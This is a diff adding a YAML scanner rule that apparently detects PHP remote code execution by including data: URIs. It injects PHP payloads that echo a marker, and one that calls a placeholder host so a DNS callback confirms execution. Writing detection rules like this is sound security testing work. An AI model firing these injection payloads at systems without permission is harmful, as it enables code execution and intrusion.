@@ -1,0 +1,16 @@
+generate:
+  - payload:
+    - 'data:,<?php echo CALC_MARKER;'
+    - 'data:,<?php file_get_contents(''http://DNS_MARKER'');'
+  - method:
+    - replace
+detect:
+  - response:
+    - body: CALC_MARKER
+  - oob:
+    - dns
+meta-info:
+  - type: rce
+  - threat: 80
+  - tags:
+    - php
